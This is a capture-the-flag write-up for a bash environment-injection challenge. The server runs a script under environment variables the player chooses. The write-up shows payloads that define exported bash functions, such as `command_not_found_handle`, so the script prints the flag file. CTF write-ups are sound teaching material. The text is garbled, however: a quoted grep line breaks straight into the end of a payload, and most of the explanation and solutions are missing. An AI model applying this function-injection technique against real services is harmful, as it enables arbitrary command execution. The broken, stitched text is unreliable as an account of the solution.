# Environmental Issues (pwn or misc, depends on who you ask; 6 flags with varying solve counts)
The server greets us with
```
Hello! Send me a json array of [key, val, arg] lists and I will
execute `key=val bash script.sh arg' for each of them. You get
a flag when you have 10, 13, and 15 solutions with unique keys.
You may need to shutdown the input (send eof, -N in nc).
```
Let's address the elephant in the room first. Take a close look at this line
of the script:
```bash
    line="$(grep "${1:?Missing arg1: name}"  /proc/$PPID/fd/1; }", "bepis"],
   ```
   (I am using `read` and `echo` instead of `cat` to avoid recursion. Just now, I have
   realized that `command cat` would also work.)
 - The last one is somewhat tricky, but that whole `imaginary` part of the script
   is makes you realize quite soon that you need to use the command not found hook
   that Ubuntu uses to tell you which apt package you need to install. A quick Google
   later, we obtain the final flag:
   ```
   ["BASH_FUNC_command_not_found_handle%%", "() { cat flag > /proc/$$/fd/1; }", "bepis"],
   ```
(Note that the above timeline is abridged. In reality, we realized how to exploit
the unintended grep issue after we already found 14 legitimate environment variables.)